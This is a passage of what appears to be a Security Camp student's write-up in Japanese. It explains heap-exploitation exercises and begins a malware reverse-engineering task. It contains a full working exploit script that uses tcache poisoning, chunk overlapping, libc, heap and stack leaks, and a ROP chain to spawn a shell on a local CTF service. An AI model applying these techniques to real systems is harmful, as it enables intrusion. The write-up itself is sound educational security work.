      "`tcache_patch_1` は、`delete_note()` が解放後のポインタとサイズを消さないために UAF が成立し、その UAF から tcache の `key` と `next` を壊せるのが問題である。結果として、heap リーク、libc リーク、AAR/AAW、そして最終的な ROP によるシェル取得まで到達できる。",
      {
        "type": "heading",
        "level": 4,
        "text": "理解度の整理"
      },
      "**どこまで理解できたか**",
      {
        "type": "list",
        "items": [
          "Cプログラム内のdelete_note関数でチャンクをNULL初期化ができていないことが発端で今回の脆弱性がつける事。",
          "チャンクの二重開放をするためにUAF用の`key` を壊すことが必要なこと。そして任意アドレスを開放済みアドレスとすることで任意の値に上書きすること。",
          "`environ` から得た stack アドレスをもとに、攻撃コード終了時にバッシュを開くことを目的としている事。"
        ]
      },
      "**どこから理解できていないのか**",
      "environ を読み出してスタックアドレスが分かった後、なぜ`stack_addr - 0x128` がリターンアドレスの位置になるのか分からない。オフセット 0x128 の根拠が分からない。",
      "**その理由・自分なりの分析**",
      "GDB でデバッガをアタッチし、`aar(libc.symbol('environ'))` 直後に停止させて計測した。",
      {
        "type": "list",
        "items": [
          "`libc.symbol('environ')` が指す値（= environ の値）: `0x7ffff8f043f8`",
          "`info frame` で確認した main のリターンアドレス格納場所（rip at）: `0x7ffff8f042d8`",
          "差: `0x7ffff8f043f8 - 0x7ffff8f042d8 = 0x120`"
        ]
      },
      "exploit では payload の先頭に `b\"A\" * 8`（= 0x8 バイト）のパディングを置いている。そのため `aaw` の書き込み開始位置を `stack_addr - 0x128` とすると、ROP チェーン本体は +8 バイト後の `stack_addr - 0x120` から始まり、これがちょうど main のリターンアドレスの位置と一致する。",
      "まとめると 0x128 = 0x120（environ 値と main リターンアドレスの距離）+ 0x8（パディング分）であり、これは常に一定であることから、攻撃コードでは直接この値を使うことができていたと推測する。",
      {
        "type": "heading",
        "level": 4,
        "text": "問4-3-2"
      },
      {
        "type": "problem",
        "blocks": [
          {
            "type": "list",
            "items": [
              "この問題はadvancedな問題です。tcache_patch_2にはsolverが付属していません。以下の課題に取り組んでください。"
            ]
          },
          "(exploitを作成する際に必要となるキーワードは「File Structure Oriented Programming (FSOP)」です。与えられている環境で実際に刺さるペイロードを使用するよう注意してください。)",
          {
            "type": "list",
            "items": [
              "tcache_poisoningやtcache_patch_1とのソースコードの差分を分析し、Exploitationの上での違いをwriteup.mdの冒頭で説明してください。",
              "上記の分析を踏まえ、exploit.pyを作成してください。",
              "問4-3-1と同様にwriteup.mdを作成してください。",
              "上記で作成したファイル群 (exploit.py, writeup.md, image/*.png)をtar.gzで固めて提出してください。"
            ],
            "ordered": true
          },
          "Exploitationの要点を押さえたスクリーンショットが付加されているか、や、どのようなコマンドを使っているかなどの創意工夫を重視します。冗長であったり自明なスクリーンショットは必要ありません。"
        ]
      },
      "まず、作成した solver（exploit.py）を示します。",
      {
        "type": "code",
        "code": "#!/usr/bin/env python3\n\nfrom ptrlib import *\n\nelf = ELF('./dist/tcache')\nlibc = ELF('./build/libc.so.6')\n\nio = Socket('localhost' , 40002)\n\ndef make(index, size):\n    io.sendlineafter(\"> \", \"1\")\n    io.sendlineafter(\"index > \", str(index))\n    io.sendlineafter(\"size > \", str(size))\n\ndef edit(index, data):\n    io.sendlineafter(\"> \", \"2\")\n    io.sendlineafter(\"index > \", str(index))\n    io.sendafter(\"data > \", data)\n\ndef show(index):\n    io.sendlineafter(\"> \", \"3\")\n    io.sendlineafter(\"index > \", str(index))\n    return io.recvuntil(\"1\")[:-1]\n\ndef delete(index):\n    io.sendlineafter(\"> \", \"4\")\n    io.sendlineafter(\"index > \", str(index))\n\ndef exit_app():\n    io.sendlineafter(\"> \", \"5\")\n\n# chunk0, 1, 2 を隣接して確保する。\n# make(0, 0x60000) は MAX_SIZE 超えで失敗するが、size[0] が 0x60000 に書き換わる。\n# その状態で edit(0) を呼ぶと、実際の chunk0(0x20) を超えて隣接チャンクへ BOF が起きる。\nmake(0, 0x18)\nmake(1, 0x18)\nmake(2, 0x18)\n\nmake(0, 0x60000)    # BOF の準備: size[0] = 0x60000 (malloc は走らない)\n\n# BOF ペイロード:\n#   chunk0 ボディを A で埋めた後、chunk1 のサイズヘッダを 0x421 に偽装する。\n#   0x421 は tcache 上限 (0x408) を超えるため、free 時に unsorted bin に入り\n#   fd/bk へ libc (main_arena) アドレスが書き込まれる。\n#   chunk2 のヘッダ・top chunk を正常値に戻してヒープ整合性を維持する。\npayload = b\"A\" * 0x18\npayload += p64(0x421)           # chunk1 サイズを偽装\npayload += b\"X\" * 0x410        # 偽チャンクのボディ\npayload += p64(0) + p64(0x21)  # chunk2 ヘッダを復元\npayload += p64(0) * 2          # chunk2 データ\npayload += p64(0) + p64(0x20c01)  # top chunk サイズを復元\n\nedit(0, payload + b\"\\n\")\ndelete(1)   # 偽 0x421 チャンクを unsorted bin へ送る\n\n# unsorted bin から 0x20 だけ切り出すと、残余 (0x401) が chunk2 と重なる位置に残る。\n# その残余の fd/bk には main_arena アドレスが入っているため、show(2) でリークできる。\nmake(1, 0x18)\nlibc_leak = u64(show(2).ljust(8, b\"\\x00\"))\nlibc.base = libc_leak - 0x21ace0\nprint(\"[+] Libc Base: \" + hex(libc.base))\n\n# 続けて chunk4 を確保・free すると、tcache の Safe Linked fd が chunk2 と同じ位置に書かれる。\n# Safe Linking: fd = ptr ^ (chunk_addr >> 12)\n# tcache 内が 1 エントリのとき fd の XOR 相手は 0 なので、<< 12 でヒープアドレスを復元できる。\nmake(4, 0x18)\ndelete(4)\n\nheap_leak = u64(show(2).ljust(8, b\"\\x00\"))\nheap_addr = heap_leak << 12\nprint(\"[+] Heap Base: \" + hex(heap_addr))\n\n# chunk4 と chunk3 を確保して free し、tcache[0x20] に 2 エントリを用意する。\n# tcache 先頭 (chunk4) の fd は chunk2 と同じメモリ位置にあるため、\n# edit(2) で fd を environ に書き換えて tcache poisoning を行う。\nmake(4, 0x18)\nmake(3, 0x18)\n\ndelete(3)   # tcache[0x20]: chunk3\ndelete(4)   # tcache[0x20]: chunk4 → chunk3\n\ntarget_environ = libc.symbol('environ')\nedit(2, p64(target_environ ^ (heap_addr >> 12)) + b\"\\n\")    # chunk4 の fd を environ に向ける\n\nmake(1, 0x18)   # chunk4 を消費\n\n# size=0 で確保すると memset(ptr, 0, 0) = 何もしない。\n# これにより environ の内容を壊さずにチャンクを取得できる。\nmake(4, 0)      # note[4] = environ アドレス (内容は破壊されない)\n\nstack_addr = u64(show(4).ljust(8, b\"\\x00\"))\nprint(\"[+] Stack Addr: \" + hex(stack_addr))\n\n# 同じ手順で tcache poisoning を再度行い、今度はスタック上のリターンアドレス付近を標的にする。\nmake(3, 0x18)\ndelete(3)   # tcache[0x20]: chunk3\ndelete(1)   # tcache[0x20]: chunk1 → chunk3\n\n# environ から得た stack_addr は main のフレーム内を指す。\n# OFFSET_TO_RBP (0x128) を引いてリターンアドレス付近 (16 バイト境界) を計算する。\nOFFSET_TO_RBP = 0x128\ntarget_stack = stack_addr - OFFSET_TO_RBP\nedit(2, p64(target_stack ^ (heap_addr >> 12)) + b\"\\n\")  # chunk1 の fd をスタックに向ける\n\nmake(1, 0x18)   # chunk1 を消費\n\n# size=0 で確保: note[3] = スタック上のアドレス (memset によるスタック破壊を回避)\nmake(3, 0)\n\n# make(3, 0x60000) は失敗するが size[3] = 0x60000 に書き換わる。\n# note[3] はスタックを指したままなので、edit(3) でスタックに大量書き込みが可能になる。\nmake(3, 0x60000)\n\n# ROP チェーン: ret スレッドでオフセットのズレを吸収し、system(\"/bin/sh\") を起動する。\nrop_sled = p64(next(libc.gadget('ret;'))) * 20\nrop_payload = p64(next(libc.gadget('pop rdi; ret;')))\nrop_payload += p64(next(libc.search(b'/bin/sh')))\nrop_payload += p64(next(libc.gadget('ret;')))       # 16 バイトアライメント調整\nrop_payload += p64(libc.symbol('system'))\n\n# note[3] (スタック) へ書き込む。edit_note() の ret 時点で ROP チェーン\nedit(3, rop_sled + rop_payload + b\"\\n\")\n\nprint(\"[*] Fire ROP Chain!!!\")\nio.interactive()",
        "lang": "python"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "ソースコードの分析"
      },
      "このプログラムは最大 5 個のノートを管理し、以下の操作を提供する。",
      {
        "type": "table",
        "header": [
          "機能",
          "説明"
        ],
        "rows": [
          [
            "make_note",
            "指定 index に malloc でチャンクを確保し、memset でゼロ初期化"
          ],
          [
            "edit_note",
            "指定 index のチャンクに fgets で書き込み"
          ],
          [
            "show_note",
            "指定 index のチャンクの内容を表示"
          ],
          [
            "delete_note",
            "指定 index のチャンクを free し、ポインタを NULL、size を 0 にリセット"
          ],
          [
            "exit",
            "プログラムを終了"
          ]
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "tcache_poisoning / tcache_patch_1 との差分"
      },
      {
        "type": "table",
        "header": [
          "比較項目",
          "tcache_poisoning",
          "tcache_patch_1",
          "tcache_patch_2"
        ],
        "rows": [
          [
            "MAX_SIZE",
            "0x50000",
            "0x50000",
            "**0x100**"
          ],
          [
            "delete 後の NULL 化",
            "あり",
            "**なし (UAF 発生)**",
            "あり"
          ],
          [
            "malloc 後の memset",
            "なし",
            "なし",
            "**あり**"
          ]
        ]
      },
      "`tcache_patch_2` では次の 2 点が追加されている。",
      {
        "type": "list",
        "items": [
          "memset による初期化 (`make_note` 内): `malloc` で確保したチャンクを即座にゼロクリアするため、tcache_poisoning で有効だった「再確保直後の残留データリーク」が封じられる。",
          "MAX_SIZE の厳格化 (0x100): tcache に入らないサイズ (> 0x400) のチャンクを直接確保できないため、そのまま free して unsorted bin 経由で libc アドレスをリークするという手法が使えなくなっている。"
        ],
        "ordered": true
      },
      "`delete_note` はポインタを NULL に戻すため、tcache_patch_1 で成立した Use-After-Free も存在しない。",
      {
        "type": "heading",
        "level": 4,
        "text": "脆弱性：size 検証前の書き込み (Heap Buffer Overflow)"
      },
      "`make_note()` に以下のバグがある。",
      {
        "type": "code",
        "code": "35:  printf(\"size > \");\n36:  if (read_int(&size[index]) != 1 || size[index] > MAX_SIZE || size[index] < 0) {\n38:    printf(\"Invalid size\\n\");\n39:    return;  // ← ここで返るが size[index] は既に書き換わっている\n40:  }\n42:  note[index] = malloc(size[index]);\n43:  memset(note[index], 0, size[index]);",
        "lang": "c"
      },
      "`read_int(&size[index])` は `scanf` で `size[index]` に直接値を書き込む。`MAX_SIZE (0x100)` を超える値を入力すると malloc は実行されずに return するが、`size[index]` は大きな値のまま残る。`note[index]` が指す既存の小さいチャンクに対して `edit_note()` を呼ぶと、実際の確保サイズを無視した Heap Buffer Overflow が起きる。",
      {
        "type": "heading",
        "level": 4,
        "text": "脆弱性：memset のサイズ 0 呼び出し"
      },
      "`make_note()` は確保したチャンクを `memset(note[index], 0, size[index])` でゼロクリアする。しかし `size[index] = 0` の場合は `memset(ptr, 0, 0)` となり実質的に何もしない。tcache poisoning で tcache から任意アドレスを取得する際に、確保サイズを 0 にすれば、その任意アドレスの内容を破壊せずにチャンクを確保できる。",
      {
        "type": "heading",
        "level": 4,
        "text": "Exploit 手順：全体フロー"
      },
      {
        "type": "list",
        "items": [
          "Chunk Overlapping による libc アドレスリーク",
          "tcache Safe Linking の解読 による heap アドレスリーク",
          "memset 回避 + tcache poisoning による `environ` の読み出し → stack アドレスリーク",
          "tcache poisoning + ROP によるシェル取得"
        ],
        "ordered": true
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Step 1 & 2: Chunk Overlapping による libc / heap アドレスリーク"
      },
      {
        "type": "code",
        "code": "make(0, 0x18)   # note[0] = チャンク0 (実サイズ 0x20)\nmake(1, 0x18)   # note[1] = チャンク1 (実サイズ 0x20)\nmake(2, 0x18)   # note[2] = チャンク2 (実サイズ 0x20)\n\nmake(0, 0x60000)  # 失敗するが size[0] = 0x60000 に書き換わる (BOF の準備)\n\npayload = b\"A\" * 0x18\npayload += p64(0x421)               # チャンク1のサイズを偽装 (0x421 = unsorted bin サイズ)\npayload += b\"X\" * 0x410             # 偽チャンクのボディを埋める\npayload += p64(0) + p64(0x21)       # チャンク2のヘッダを正常値に戻す\npayload += p64(0) * 2               # チャンク2のデータ領域\npayload += p64(0) + p64(0x20c01)    # top chunk サイズを修復\n\nedit(0, payload + b\"\\n\")            # BOF でヒープ上の隣接チャンクのメタデータを書き換え\ndelete(1)                           # 偽サイズ 0x421 のチャンクを free → unsorted bin に入り fd/bk に libc アドレスが書き込まれる\n\nmake(1, 0x18)                       # unsorted bin から 0x20 だけ切り出す\n                                    # 残り 0x401 チャンクが チャンク2 の位置と重なる\nlibc_leak = u64(show(2).ljust(8, b\"\\x00\"))  # チャンク2 = unsorted bin 残余の fd → main_arena アドレスがリーク\nlibc.base = libc_leak - 0x21ace0",
        "lang": "python"
      },
      "unsorted bin に入った 0x421 チャンクから 0x20 切り出した後、残余の fd が `note[2]` と同じアドレスを指す。`show(2)` で libc の `main_arena` 近辺のアドレスをリークできる。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-2-01-chunk-overlapping-heap.png",
        "alt": "BOF後のヒープ状態 (偽 0x421 チャンク)"
      },
      "続けてヒープアドレスをリークする。",
      {
        "type": "code",
        "code": "make(4, 0x18)   # unsorted bin 残余から 0x20 を確保 (チャンク2 と重なる位置に chunk4)\ndelete(4)       # chunk4 を tcache[0x20] に入れる → Safe Linked fd が チャンク2 と同じ位置に書かれる\n\nheap_leak = u64(show(2).ljust(8, b\"\\x00\"))   # tcache の fd (Safe Linked) を読み出し\nheap_addr = heap_leak << 12                  # XOR キーを解いてヒープベースを復元",
        "lang": "python"
      },
      "tcache に入った chunk4 の fd は `ptr ^ (chunk_addr >> 12)` でエンコードされる (Safe Linking)。唯一のエントリの場合 fd は 0 と XOR されるため、リークした値を `<< 12` するとヒープのアドレスが得られる。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-2-02-heap-leak-tcache.png",
        "alt": "chunk4 free後のtcache bins (tcache 0x20 にheapアドレス)"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Step 3: memset 回避 + tcache poisoning による environ 読み出し"
      },
      {
        "type": "code",
        "code": "make(4, 0x18)   # chunk4 を tcache から回収\nmake(3, 0x18)   # ダミー chunk3 を確保\n\ndelete(3)       # tcache[0x20]: chunk3\ndelete(4)       # tcache[0x20]: chunk4 → chunk3",
        "lang": "python"
      },
      "tcache[0x20] の先頭は chunk4。その fd (chunk3 への Safe Linked ポインタ) は `note[2]` と同じメモリ位置にある。",
      {
        "type": "code",
        "code": "target_environ = libc.symbol('environ')\nedit(2, p64(target_environ ^ (heap_addr >> 12)) + b\"\\n\")\n# note[2] への書き込み = chunk4 の tcache fd を libc の environ に向け直す",
        "lang": "python"
      },
      "tcache[0x20] が `chunk4 → environ` の順になった。",
      {
        "type": "code",
        "code": "make(1, 0x18)   # chunk4 を消費\nmake(4, 0)      # environ のアドレスにチャンクを確保 (size=0 → memset(ptr,0,0) = 何もしない!)",
        "lang": "python"
      },
      "`size[4] = 0` にする。`memset(note[4], 0, 0)` は何も書き換えないため、environ の内容が保持される。",
      {
        "type": "code",
        "code": "stack_addr = u64(show(4).ljust(8, b\"\\x00\"))",
        "lang": "python"
      },
      "`environ` には環境変数ポインタが格納されており、これがスタックアドレスを指している。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-2-03-environ-alloc-note.png",
        "alt": "tcache poisoning後にenvironを確保した直後のnote配列"
      },
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-2-03-tcache-environ.png",
        "alt": "environ を指す tcache 0x20 の状態"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Step 4: tcache poisoning によるスタックへの書き込みと ROP"
      },
      {
        "type": "code",
        "code": "make(3, 0x18)\ndelete(3)       # tcache[0x20]: chunk3\ndelete(1)       # tcache[0x20]: chunk1 (ダミー) → chunk3\n\nOFFSET_TO_RBP = 0x128\ntarget_stack = stack_addr - OFFSET_TO_RBP   # main 関数のリターンアドレス付近 (16バイト境界に揃える)\nedit(2, p64(target_stack ^ (heap_addr >> 12)) + b\"\\n\")\n# chunk1 の fd をスタック上の target_stack に向け直す\n\nmake(1, 0x18)   # chunk1 を消費\nmake(3, 0)      # target_stack にチャンクを確保 (size=0 → memset 回避でスタックを破壊しない)\n                # note[3] = スタック上のアドレス\n\nmake(3, 0x60000)  # 失敗するが size[3] = 0x60000 に書き換わる (スタックへの BOF を準備)",
        "lang": "python"
      },
      "`make(3, 0)` で確保した note[3] はスタック上を指す。続いて `make(3, 0x60000)` は size[3] を大きな値にするだけで note[3] は変わらない。",
      {
        "type": "code",
        "code": "rop_sled    = p64(next(libc.gadget('ret;'))) * 20         # オフセットのズレを吸収する ret スレッド\nrop_payload = p64(next(libc.gadget('pop rdi; ret;')))\nrop_payload += p64(next(libc.search(b'/bin/sh')))\nrop_payload += p64(next(libc.gadget('ret;')))              # movaps SIGSEGV 回避のスタックアライメント\nrop_payload += p64(libc.symbol('system'))\n\nedit(3, rop_sled + rop_payload + b\"\\n\")\n# note[3] (= スタック) に対して size[3]=0x60000 の fgets → ROP チェーンをスタックに書き込む",
        "lang": "python"
      },
      "`edit_note()` が return した瞬間に ret スレッドを通って ROP チェーンが実行され、`system(\"/bin/sh\")` が起動する。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-2-04-tcache-stack-poisoning.png",
        "alt": "スタックへの tcache poisoning 直後の tcache bins"
      },
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-2-04-rop-payload-on-stack.png",
        "alt": "ROP ペイロード書き込み後のスタック (ret 直前)"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Step 5: シェル取得"
      },
      {
        "type": "code",
        "code": "io.interactive()",
        "lang": "python"
      },
      "`edit_note()` のリターンで ROP チェーンが発火し、シェルが起動する。",
      {
        "type": "image",
        "src": "/assets/img/blog/security-camp/4-3-2-05-shell.png",
        "alt": "シェル取得"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "まとめ"
      },
      "`tcache_patch_2` は UAF が塞がれており、直接 tcache の fd を読み書きできない。また `memset` により確保直後のチャンクがゼロクリアされ、リーク手段も制限されている。",
      "しかし Heap BOF による Chunk Overlappingを使うと、`note[2]` と tcache に入ったチャンクの fd が同一メモリを指す状態を作れる。これにより UAF なしで tcache poisoning が可能になる。",
      "さらにsize=0 で malloc することで `memset(ptr, 0, 0)` を実質ノーオペレーションにでき、environ やリターンアドレス付近のスタックを破壊せずにチャンクを確保できる。",
      "最終的な攻撃フローは以下の通り。",
      {
        "type": "list",
        "items": [
          "BOF で隣接チャンクのサイズを偽装 → unsorted bin に送り込み libc リーク",
          "Chunk Overlapping + tcache の Safe Linked fd の解読で heap リーク",
          "tcache poisoning + size=0 malloc で `environ` を読み stack リーク",
          "同様の tcache poisoning + size=0 malloc でスタック上にチャンクを確保し、BOF + ROP でシェル取得"
        ],
        "ordered": true
      },
      {
        "type": "heading",
        "level": 4,
        "text": "理解度の整理"
      },
      "**どこまで理解できたか**",
      {
        "type": "list",
        "items": [
          "**共通の脆弱性**: tcache_patch_1とtcache_patch_2ではmake_page関数で上限を超えるサイズの入力がされても、エラーで弾かれるが変数sizeが入力値に代わってしまう脆弱性がある。これによりedit実行時に実際に確保されたメモリサイズを無視して大量のデータを書き込むことが可能になる。",
          {
            "text": "**patch_1 と patch_2 の脆弱性の差**:",
            "list": {
              "ordered": false,
              "items": [
                "tcache_patch_1ではdelete_page関数でメモリ開放後にも古いデータが残るという脆弱性があったが、tcache_patch_2ではmemset関数によりデータがクリアされる。",
                "tcache_patcdh_2では確保できる最大サイズが0x100と制限されており、巨大なメモリを確保することができない。これにより、tcache_patch_1と同様にUnsorted Binに入れる事でlibc アドレスをリークすることができなくなった。"
              ]
            }
          },
          "**致命的な脆弱性**: make_page関数でsize=0の時、memsetが何もしないのでenvironが読めることを発見した。"
        ]
      },
      "**どこから理解できていないのか**",
      {
        "type": "list",
        "items": [
          "**FSOPを使った攻撃コードの作成**: make関数でFile構造にチャンクを確保してファイル構造体を記述すればよいと思うが、その構造体定義ができない。"
        ]
      },
      "**その理由・自分なりの分析**",
      {
        "type": "list",
        "items": [
          "FILE 構造体は libc の固定オフセット にあるため、libc ベースさえわかれば場所が特定できる。",
          "make関数でFile構造にチャンクを確保してファイル構造体を記述すればよいが、具体的なフィールドの値がわからない。",
          "今回の問題ではスタックアドレスを取得しづらい構成だった、FSOPで攻撃しやすい構成だったと考える。",
          "memset関数でsize=0の時にリセットされない場合、FSOPでないと攻撃できない？"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "問5",
        "id": "section-5"
      },
      {
        "type": "problem",
        "blocks": [
          "以下のバイナリを解析し、flagを取得してください。flag形式はseccamp{}です。flagを取得するにいたった流れ、関数の流れについても説明してください。解けなかった場合でも、理解した範囲まで書いてください。※PC上でマルウェア判定される可能性があるので、VM上やウイルス対策を停止(非推奨)してから作業するとよいです。※zipパスワードはinfectedです。",
          "https://drive.google.com/file/d/1lb9xi-y0JxbyMto9NlsY_ID3I53J1B3Q/view?usp=drive_link"
        ]
      },
      "取得したflag：seccanp{th3_truth_1ie5_0n_m3m0ry}",
      {
        "type": "heading",
        "level": 3,
        "text": "1. 静的ファイル調査"
      },
      "まず最初に実行ファイルをWSL環境で静的に調査しました。実行ファイルをいきなり実行するのはセキュリティ上躊躇ったからです。具体的なコマンドとしては",
      {
        "type": "list",
        "items": [
          "file",
          "objdump",
          "rabin2",
          "strings"
        ]
      },
      "を実行した。実行ファイル自体にプレーンなflagがないのか探すとともに、実行ファイルのファイル情報を整理した。",
      {
        "type": "heading",
        "level": 4,
        "text": "file"
      },
      "fileコマンド実行結果：",
      {
        "type": "code",
        "code": "c5.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 (stripped to external PDB), 9 sections",
        "lang": "bash"
      },
      "この結果、ファイル拡張子通りのWindows実行ファイルである可能性が高いことが分かりました。",
      {
        "type": "heading",
        "level": 4,
        "text": "objdump"
      },
      "objdump実行結果抜粋：",
      {
        "type": "code",
        "code": "c5.exe:     file format pei-i386\nc5.exe\narchitecture: i386, flags 0x00000103:\nHAS_RELOC, EXEC_P, D_PAGED\nstart address 0x00401460\n\nCharacteristics 0x30e\n\texecutable\n\tline numbers stripped\n\tsymbols stripped\n\t32 bit words\n\tdebugging information removed",
        "lang": "bash"
      },
      "この結果、この実行ファイルのエントリーポイントが0x00401460であることが分かりました。",
      {
        "type": "heading",
        "level": 4,
        "text": "rabin2"
      },
      {
        "type": "code",
        "code": "arch     x86\nbaddr    0x400000\nbinsz    19968\nbintype  pe\nbits     32\ncanary   true\ninjprot  false\nretguard false\nclass    PE32\ncmp.csum 0x000059f8\ncompiled Fri Mar  6 02:41:00 2026\ncrypto   false\nendian   little\nhavecode true\nhdr.csum 0x000059f8\nladdr    0x0\nlang     c\nlinenum  true\nlsyms    true\nmachine  i386\nnx       true\nos       windows\noverlay  false\ncc       cdecl\npic      true\nrelocs   false\nsigned   false\nsanitize false\nstatic   false\nstripped true\nsubsys   Windows CUI\nva       true",
        "lang": "bash"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "strings"
      },
      "strings実行結果抜粋：",
      {
        "type": "code",
        "code": "DeleteCriticalSection\nEnterCriticalSection\nFreeLibrary\nGetLastError\nGetModuleHandleA\nGetProcAddress\nInitializeCriticalSection\nLeaveCriticalSection\nLoadLibraryA\nSetUnhandledExceptionFilter\nSleep\nTlsGetValue\nVirtualAlloc\nVirtualProtect\nVirtualQuery\n__getmainargs\n__p__fmode\n__p__iob\n__p___initenv\n__p__commode\n__set_app_type\n__setusermatherr\n_amsg_exit\n_cexit\n_initterm\nabort\natexit\ncalloc\nexit\nfflush\nfprintf\nfree\nmalloc\nmemcpy\nsetvbuf\nsignal\nstrlen\nstrncmp\nvfprintf\nKERNEL32.dll\nmsvcrt.dll",
        "lang": "bash"
      },
      {
        "type": "code",
        "code": "&&&&\n&&&&\n&&&&\n&&&&\n&&&&\n&&&&\n6'&&\n&&&&\n&&&&\n&&&P\n&&&&\n&&&&\n&&&)\n&&&&\n&&&&\n&&&&\nMCTH\nBJJ&\nZ\"&&\naCRv\nTIEg\ngBBT\nCUU&\nb\"&&\naCRu\nRBnG\nBnGH\nBJC&\nqTOR\nCeIH\nIHUI\nJCg&",
        "lang": "bash"
      },
      "上記の結果は、下記のimportがされていました。",
      {
        "type": "list",
        "items": [
          "**VirtualAlloc / VirtualProtect**: 自己書き換えコード・アンパックの可能性",
          "**LoadLibraryA / GetProcAddress**: 動的インポート解決（本当の関数呼び出しを隠している）",
          "**strncmp**: flagの文字列比較がここで行われる可能性大",
          "**Sleep / TlsGetValue**: アンチデバッグの可能性"
        ]
      },
      "また、stringsの出力途中で`&&&&`が大量に連続するパターンを発見しました。`&`のASCIIコードは`0x26`です。バイナリのパディング領域などにはヌルバイト（`0x00`）が多く含まれており、XOR暗号化されると`0x00 XOR key = key`となるため、鍵そのものが連続して現れます。つまり`&&&&`の連続はヌルバイトが`0x26`でXORされた結果と考えられ、鍵が`0x26`である可能性が高いと判断しました。試しにXOR 0x26でデコードすると、下記のような結果になることが分かりました。この結果から、kerne132.dllのAPIを動的に解決して呼び出していると考えました。",
      {
        "type": "table",
        "header": [
          "エンコード文字列",
          "デコード結果"
        ],
        "rows": [
          [
            "`MCTH`",
            "`kern`"
          ],
          [
            "`BJJ&`",
            "`dll\\0`"
          ],
          [
            "`aCRv + TIEg + gBBT + CUU&`",
            "`GetProcAddress`"
          ],
          [
            "`aCRu + RBnG + BnGH + BJC&`",
            "`GetStdHandle`"
          ],
          [
            "`qTOR + CeIH + IHUI + JCg&`",
            "`WriteConsoleA`"
          ]
        ]
      },
      "まとめると、下記のような実行ファイルであることが判明しました。",
      {
        "type": "list",
        "items": [
          "**形式**: PE32 (32bit Windows 実行ファイル)",
          "**アーキテクチャ**: x86 (i386)",
          "**コンパイラ**: GCC 15.2.0 (MSYS2 / MinGW)",
          "**コンパイル日時**: Fri Mar 6 02:41:00 2026",
          "**エントリポイント**: 0x00401460",
          "**シンボル**: stripped（デバッグ情報なし）",
          "**Stack Canary**: あり",
          "**サブシステム**: Windows CUI（コンソールアプリ）"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "2. XORのデコード"
      },
      "次に実行ファイルに埋め込まれたエンコード文字列を直接デコードすることでflagが取得できないか考えました。具体的にはpythonスクリプトを実行しました。",
      {
        "type": "code",
        "code": "data = open('c5.exe','rb').read()\ndecoded = bytes(b ^ 0x26 for b in data)\nimport re\nfor m in re.finditer(b'[ -~]{4,}', decoded):\n    s = m.group().decode()\n    if '&' not in s:\n        print(hex(m.start()), s)",
        "lang": "python"
      },
      "実行結果",
      {
        "type": "code",
        "code": "0x21cb kern\n0x21d2 el32\n0x21d9 l32.\n0x21ff GetP\n0x2206 rocA\n0x220d Addr\n0x223a GetS\n0x2241 tdHa\n0x2248 dHan\n0x2256 Writ\n0x225d eCon\n0x2264 onso",
        "lang": "bash"
      },
      "GetProcAddress, GetStdHandle, WriteConsoleAが埋め込まれていると考えました。",
      {
        "type": "heading",
        "level": 3,
        "text": "3. 逆コンパイル"
      },
      "次にこの実行ファイルの逆コンパイルを試みました。使用ツールとしてwindows版のghidrunを使いました。これは実行ファイルから逆アセンブラから逆コンパイルまでできるツールで、今回の探索に有効だと考えたからです。",
      "手順1で得たエントリーポイント`0x00401460`をアセンブラで追い、その逆コンパイル結果の記述から処理内容を追いました。",
      "逆コンパイル結果：",
      {
        "type": "code",
        "code": "void entry(void)\n\n{\n  DAT_0040605c = 0;\n  FUN_00401030();\n  return;\n}"
      },
      "ここのFUN_00401030関数はＧＣＣのＣＲＴ初期化を行っており、その中の uVar10 = FUN_00402920();という部分がmain関数ではないかと考えました。",
      {
        "type": "code",
        "code": "undefined4 FUN_00401030(void)\n\n{\n  undefined4 *puVar1;\n  int iVar2;\n  int iVar3;\n  undefined4 *puVar4;\n  int iVar5;\n  undefined4 *puVar6;\n  int unaff_EBX;\n  undefined4 *puVar7;\n  undefined1 **unaff_EBP;\n  int unaff_ESI;\n  undefined4 *unaff_EDI;\n  int unaff_FS_OFFSET;\n  bool bVar8;\n  undefined4 uVar9;\n  undefined4 uVar10;\n  undefined4 *puVar11;\n  undefined4 uVar12;\n  int local_3c;\n  undefined4 local_24 [3];\n  undefined1 *local_18;\n  int iStack_14;\n  int iStack_10;\n  undefined4 *puStack_c;\n  undefined1 *apuStack_8 [2];\n  \ncode_r0x00401030:\n  local_18 = &stack0x00000004;\n  iVar5 = *(int *)(*(int *)(unaff_FS_OFFSET + 0x18) + 4);\n  iStack_14 = unaff_EBX;\n  iStack_10 = unaff_ESI;\n  puStack_c = unaff_EDI;\n  apuStack_8[0] = (undefined1 *)unaff_EBP;\n  while( true ) {\n    iVar3 = 0;\n    LOCK();\n    bVar8 = DAT_00406038 == 0;\n    iVar2 = iVar5;\n    if (!bVar8) {\n      iVar3 = DAT_00406038;\n      iVar2 = DAT_00406038;\n    }\n    DAT_00406038 = iVar2;\n    UNLOCK();\n    if (bVar8) {\n      local_3c = 0;\n      goto LAB_0040107b;\n    }\n    if (iVar5 == iVar3) break;\n    Sleep(1000);\n  }\n  local_3c = 1;\nLAB_0040107b:\n  if (DAT_0040603c == 1) goto LAB_00401431;\n  if (DAT_0040603c != 0) {\n    DAT_00406004 = 1;\nLAB_004010a0:\n    if (local_3c == 0) {\n      DAT_00406038 = local_3c;\n      LOCK();\n      UNLOCK();\n    }\n    uVar12 = 0;\n    uVar10 = 2;\n    uVar9 = 0;\n    tls_callback_0(0,2);\n    puVar4 = (undefined4 *)__p___initenv(uVar9,uVar10,uVar12);\n    uVar9 = DAT_0040600c;\n    *puVar4 = DAT_0040600c;\n    puVar4 = DAT_00406014;\n    puVar11 = 